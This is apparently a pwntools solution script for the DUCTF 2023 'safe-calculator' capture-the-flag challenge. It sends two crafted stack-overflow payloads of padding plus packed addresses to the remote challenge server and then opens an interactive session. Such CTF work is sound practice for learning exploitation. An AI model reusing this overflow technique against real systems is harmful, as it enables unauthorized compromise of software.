# 0xb98c5f37

# a = 0x5c472f00
# b = 0x5d453037

from pwn import *

# p = process("./safe-calculator")
# gdb.attach(p)

p = remote("2023.ductf.dev", 30015)

p.recvuntil(b"> ")
p.sendline(b"2")

payload = b"A"*36 + p32(0x5d453037) + b"A"*4 + p32(0x5c472f20)

p.recvuntil(b"review! :")
p.sendline(payload)

second_payload = b"A"*36 + p32(0x5d453037) + b"A"*4 + b"\x10" # illegal byte zeroes over 0x20 from the previous input

p.recvuntil(b"> ")
p.sendline(b"2")

p.recvuntil(b"review! :")
p.sendline(second_payload)

p.interactive()


